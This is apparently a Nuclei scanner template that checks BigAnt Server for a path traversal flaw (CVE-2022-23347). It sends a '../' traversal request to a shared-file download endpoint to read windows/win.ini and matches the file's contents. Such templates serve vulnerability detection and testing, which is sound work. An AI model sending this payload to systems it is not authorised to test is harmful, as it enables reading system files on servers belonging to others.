id: bigant-server-downloadsharedfile-path-traversal
info:
  name: BigAnt Server Path Traversal Vulnerability (CVE-2022-23347)
  author: ProjectDiscoveryAI
  severity: medium
  tags: CVE-2022-23347,path-traversal
http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "; for 16-bit app support"
          - "[files]"
      - type: word
        words:
          - "<"
        negative: true
